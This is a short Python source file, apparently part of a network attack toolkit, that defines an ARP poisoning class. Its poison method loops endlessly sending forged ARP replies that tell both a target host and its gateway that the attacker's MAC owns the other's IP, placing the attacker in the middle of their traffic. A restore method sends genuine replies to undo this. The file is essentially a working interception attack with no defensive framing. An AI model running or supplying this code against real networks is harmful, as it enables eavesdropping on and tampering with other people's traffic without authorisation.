from arp import ArpRequest, ARP
from scanner import Local
import time


class ArpPoison:
    @staticmethod
    def poison(local_mac, target_ip, target_mac, gateway_ip, gateway_mac):
        print("[*] Starting ARP Poisoning Attack...")
        while True:
            # Send Arp Packets to poison target and gateway
            ARP.send_arp(src_mac=local_mac, src_ip=gateway_ip,
                         dst_mac=target_mac, dst_ip=target_ip, operation=ARP.OPCODE_REPLY)
            ARP.send_arp(src_mac=local_mac, src_ip=target_ip,
                         dst_mac=gateway_mac, dst_ip=gateway_ip, operation=ARP.OPCODE_REPLY)
            time.sleep(2)

    @staticmethod
    def restore(target_ip, target_mac, gateway_ip, gateway_mac):
        try:
            print("[*] Restoring ARP tables...")
            # Send Arp Packets to restore target and gateway
            for _ in range(3):
                ARP.send_arp(src_mac=gateway_mac, src_ip=gateway_ip,
                             dst_mac=target_mac, dst_ip=target_ip, operation=ARP.OPCODE_REPLY)
                time.sleep(0.1)
                ARP.send_arp(src_mac=target_mac, src_ip=target_ip, dst_mac=gateway_mac,
                             dst_ip=gateway_ip, operation=ARP.OPCODE_REPLY)
                time.sleep(0.1)
        except Exception:
            print("[!] Failed to restore ARP tables.")
